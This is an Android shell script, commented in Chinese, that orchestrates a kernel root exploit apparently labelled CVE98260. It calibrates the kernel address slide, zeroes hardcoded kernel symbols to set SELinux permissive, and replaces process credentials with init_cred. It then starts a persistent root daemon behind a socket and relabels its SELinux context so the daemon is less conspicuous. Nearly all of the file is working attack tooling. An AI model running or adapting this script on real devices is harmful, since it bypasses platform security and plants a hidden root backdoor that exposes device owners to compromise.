#!/system/bin/sh
# 单次完整尝试：calibrate(缓存+重试) -> zerosym -> SELinux -> cred(EXEC91+rootd)
cd /data/local/tmp || exit 1
BOOT=$(cat /proc/sys/kernel/random/boot_id)
# 硬复位会把 att_seq.txt 写成空文件（page cache 丢失），必须容错
N=$(cat /data/local/tmp/att_seq.txt 2>/dev/null | tr -dc '0-9')
[ -z "$N" ] && N=0
N=$((N+1)); echo $N > /data/local/tmp/att_seq.txt; sync
OUT=/data/local/tmp/att_$N.txt
ln -sf $OUT /data/local/tmp/att_out.txt
exec > $OUT 2>&1
UP=$(cut -d' ' -f1 /proc/uptime)
echo "=== BOOT=$BOOT UP=$UP ATT=$N ==="
echo 1 > /sys/kernel/tracing/events/kmem/rss_stat/enable 2>/dev/null

# 上一轮遗留的 exploit（已 setsid 脱离，timeout -k 也打不到）会一直停在
# for(;;) pause() 里空转烧 CPU，起手先清干净；绝不能写成 pkill -f 'libroot.so'，
# 那会把常驻 rootd 一起杀掉（rootd 是复用检查要用的）。
pkill -9 -f 'libroot.so exploit' 2>/dev/null
sleep 1

# rootcmd.sh 必须在复用检查之前写好：REUSE 路径也要用最新版脚本
# （否则 rootd 幂等检查之类的修复永远只在真正跑 exploit 那一轮生效）。
cat > /data/local/tmp/rootcmd.sh <<'EOS'
#!/system/bin/sh
# 诊断：在 exec 重定向之前先写一个独立探针文件。
# 若 rootprobe.txt 出现而 rootout2.txt 不出现 => sh 能跑、能 open 文件，
# 问题只在 "exec > file" 这一句；若两个都没有 => execve 后的 shell 没跑起来。
echo "alive uid=$(id -u)" > /data/local/tmp/rootprobe.txt 2>&1
echo "ppid=$PPID pid=$$" >> /data/local/tmp/rootprobe.txt 2>&1
exec > /data/local/tmp/rootout2.txt 2>&1
echo "=== context before ==="
cat /proc/self/attr/current 2>&1
# 对齐 fucroot：它的 cred 替换保留真实 security 指针，落地的 shell 仍在原域。
# 我们直接指 init_cred，其 sid=SECINITSID_KERNEL，所以默认落在 u:r:kernel:s0 ——
# 真机上 ps -Z 一眼可见，非常显眼。
# 切 u:r:shell:s0 = 「保留原域」的等价效果（cred_child 本来就是 shell 域）。
# 不再用 u:r:su:s0：实测该域的 socket 节点在 SELinux 回到 Enforcing 后连
# ls -l 都 Permission denied，KSU late-load 强制 setenforce(true) 时 rootd 会失联。
echo u:r:shell:s0 > /proc/self/attr/current 2>/dev/null
echo "=== context after ==="
cat /proc/self/attr/current 2>&1
echo "=== id ==="
id
echo "=== status ==="
grep -E '^(Uid|Gid|CapEff):' /proc/self/status
echo "=== selinux ==="
getenforce
echo "=== rootd start ==="
# 在这里拉起常驻 rootd：本脚本正运行在 execve 后的 root 上下文里，
# cred 是 prepare_creds() 生成的真实对象，fork/退出都安全。
# 若在 cred_child 里直接 fork（仍持有静态 init_cred），子进程会立刻死在 progress=91。
# 幂等：已有 rootd 在跑就不再拉起第二个（重复拉起会把 socket unlink 重建，
# 导致多个 rootd 进程堆积，长跑时会污染 ps 与内存）。
# 注意：这里不能再用 "libroot.so su -c true" 探测 rootd 活着没有 —— rootd 是单线程的，
# 本脚本此刻正被那个 rootd 服务着，嵌套请求永远等不到 accept（实测 10s 超时），
# 结果反而每次 REUSE 都多拉一个 rootd（出现过 23205 + 26842 双开）。
# 清掉上一个 boot 遗留的 root 属主 socket（sticky 目录下 shell 删不掉，这里已是 root）
rm -f /data/local/tmp/pc98260-root.sock 2>/dev/null
if ! ps -A -o ARGS 2>/dev/null | grep -a 'libroot.so rootd' | grep -av grep >/dev/null; then
  /data/local/tmp/libroot.so rootd > /data/local/tmp/rootd.log 2>&1 &
  sleep 1
fi
ls -l /data/local/tmp/pc98260-root.sock 2>&1
echo "=== rootd log ==="
head -4 /data/local/tmp/rootd.log 2>&1
echo "=== DONE ==="
EOS
chmod 755 /data/local/tmp/rootcmd.sh

# ---------- 复用检查 ----------
# rootd 还活着就直接收工：既不删 socket，也不 pkill（那样会误杀常驻 rootd），
# 更不重跑 exploit（重复 UAF 只会缩短内核寿命）。
if [ -S /data/local/tmp/pc98260-root.sock ]; then
  RU=$(timeout 15 ./libroot.so su -c 'id -u' 2>/dev/null | head -1)
  if [ "$RU" = "0" ]; then
    echo "=== REUSE: rootd 仍然可用，跳过 exploit ==="
    rm -f /data/local/tmp/rootout2.txt
    timeout 20 ./libroot.so su -c 'sh /data/local/tmp/rootcmd.sh' >/dev/null 2>&1
    echo "--- rootout2 ---"
    cat /data/local/tmp/rootout2.txt 2>/dev/null
    echo "--- rootd proc (cmdline + 域) ---"
    for p in $(pidof libroot.so 2>/dev/null); do
      echo "$p $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null) dom=$(cat /proc/$p/attr/current 2>/dev/null)"
    done
    echo "=== ATTEMPT END (reuse) ==="
    sync
    exit 0
  fi
  echo "socket 在但 rootd 无响应，重跑 exploit"
fi

# ---------- slide ----------
is_aligned() { case "$1" in *00000) return 0;; *) return 1;; esac; }
SLIDE=
if [ -f slide_cache.txt ]; then
  CB=$(sed -n 1p slide_cache.txt 2>/dev/null)
  CS=$(sed -n 2p slide_cache.txt 2>/dev/null)
  if [ "$CB" = "$BOOT" ] && [ -n "$CS" ] && is_aligned "$CS"; then SLIDE="$CS"; fi
fi
if [ -z "$SLIDE" ]; then
  n=0
  while [ $n -lt 4 ]; do
    ./libroot.so calibrate-a 2048 2 < cve98260/profile.framed > cal.txt 2>&1
    # 只认 'calib_a] slide = 0x...' 这一行；'note: slide not 2MiB-aligned' 不算
    SLIDE=$(grep -a 'calib_a] slide = ' cal.txt | tail -1 | sed 's/.*slide = //' | tr -d ' ')
    if is_aligned "$SLIDE"; then break; fi
    echo "calib retry $n: unaligned [$SLIDE]"
    SLIDE=
    n=$((n+1))
    sleep 2
  done
  if [ -n "$SLIDE" ]; then echo "$BOOT" > slide_cache.txt; echo "$SLIDE" >> slide_cache.txt; fi
fi
if [ -z "$SLIDE" ]; then echo "NO ALIGNED SLIDE"; exit 1; fi
echo "SLIDE=$SLIDE"
sync

rm -f rc_logic.log rc_cred.log rootout2.txt rootprobe.txt pc98260-root.sock

# ---------- phase1: zerosym + SELinux（同 boot 已 permissive 则跳过）----------
SELDONE=$(cat /data/local/tmp/sel_done.txt 2>/dev/null)
if [ "$SELDONE" = "$BOOT" ] && [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ]; then
  echo "phase1 skipped (same boot, already permissive)"
else
ZS=0xffffffc00a457c8c,0xffffffc00a20d4b8,0xffffffc00a21c228,0xffffffc00a21c228,0xffffffc00a21c228,0xffffffc00a1fac0c,0xffffffc00a1fac0c,0xffffffc00a1fad68,0xffffffc00a1fad68,0xffffffc00a1fae98,0xffffffc00a1fae6c
CVE98260_LOG=/data/local/tmp/rc_logic.log CVE98260_ZERO_SYMS=$ZS \
CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 timeout -k 5 380 ./libroot.so exploit \
--slide $SLIDE --page-offset 0xffffff7f80000000 < cve98260/profile.framed > /dev/null 2>&1 &
i=0
while [ $i -lt 260 ]; do
  grep -qa 'selinux-only: parked' /data/local/tmp/rc_logic.log 2>/dev/null && break
  [ "$(cat /proc/sys/kernel/random/boot_id)" != "$BOOT" ] && { echo "REBOOT during phase1"; exit 2; }
  sleep 1; i=$((i+1))
done
echo "phase1 wait=${i}s enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)"
sync
# 只杀 exploit 进程；绝不能写成 pkill -f 'libroot.so'，那会把常驻 rootd 一起杀掉
pkill -9 -f 'libroot.so exploit' 2>/dev/null
sleep 1
[ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] && echo "$BOOT" > /data/local/tmp/sel_done.txt
fi

# ---------- phase2: cred ----------
CVE98260_LOG=/data/local/tmp/rc_cred.log \
CVE98260_CRED_INIT_PARENT8=1 CVE98260_NO_LOG_PROC=1 CVE98260_CHILD_FLAG=1 \
CVE98260_CHILD_EXEC91=1 CVE98260_TASK_CRED2=0x830 \
CVE98260_CRED_MODE=init CVE98260_NO_FIXUP=1 PLANT_FAST=1 CVE98260_GIVE_UP_EXIT=1 \
CVE98260_ONE_SHOT=1 \
timeout -k 8 300 ./libroot.so exploit --slide $SLIDE \
--page-offset 0xffffff7f80000000 < cve98260/profile.framed > /dev/null 2>&1
echo "phase2 rc=$?"
sync
[ "$(cat /proc/sys/kernel/random/boot_id)" != "$BOOT" ] && { echo "REBOOT during phase2"; exit 3; }
echo "--- cred tail ---"
tail -6 /data/local/tmp/rc_cred.log 2>/dev/null
# phase2 的 timeout -k 8 打不到已经被 setsid 拆走的子孙，收尾统一清一次，
# 否则残留在 for(;;) pause() 里的 exploit 会各自烧 10~20% CPU（实测 6 个孤儿）。
pkill -9 -f 'libroot.so exploit' 2>/dev/null
sleep 1

echo "--- rootd start log ---"
# rootout2.txt 由 rootcmd.sh 在 cred_child execve 出去的 shell 里异步写，
# phase2 一返回就读会读到空文件（时序问题，不是没起来）。这里等 DONE 或超时。
j=0
while [ $j -lt 15 ]; do
  grep -qa '=== DONE ===' /data/local/tmp/rootout2.txt 2>/dev/null && break
  sleep 1; j=$((j+1))
done
grep -aE '=== (context|id|status|selinux|rootd)|^uid=|^CapEff|^-rw|^srw|^Permission denied|^ls:'   /data/local/tmp/rootout2.txt 2>/dev/null | head -12
[ -f /data/local/tmp/rootout2.txt ] || echo "(rootout2.txt 不存在: rootcmd.sh 没跑起来)"
echo "--- rootprobe（exec 之前的第一手证据）---"
cat /data/local/tmp/rootprobe.txt 2>/dev/null || echo "(rootprobe.txt 也不存在 => sh 根本没起来)"

echo "--- rootd proc (cmdline + 域) ---"
# 注意：rootd 的 cmdline 是 "libroot.so rootd"，不是 exploit，旧版 grep 写错了。
for p in $(pidof libroot.so 2>/dev/null); do
  echo "$p $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null) dom=$(cat /proc/$p/attr/current 2>/dev/null)"
done
echo "--- 残留 exploit（应为空）---"
ps -A -o PID,USER,ARGS 2>/dev/null | grep -a 'libroot.so exploit' | grep -av grep | head -4

echo "--- rootd sock ---"
# rootd 由 rootcmd.sh 异步拉起，这里等最多 10s 再 ls，避免必然的 ENOENT 误报。
# 也要看 abstract socket —— path socket 失败时 pc98260_su 会自动 fallback 到它。
k=0
while [ $k -lt 10 ]; do
  [ -S /data/local/tmp/pc98260-root.sock ] && break
  sleep 1; k=$((k+1))
done
ls -l /data/local/tmp/pc98260-root.sock 2>&1
grep -a 'pc98260-rootd:' /proc/net/unix 2>/dev/null | head -2

echo "--- su via rootd ---"
timeout 20 ./libroot.so su -c 'id; echo ROOTD-OK' 2>&1 | head -6
echo "=== ATTEMPT END ==="
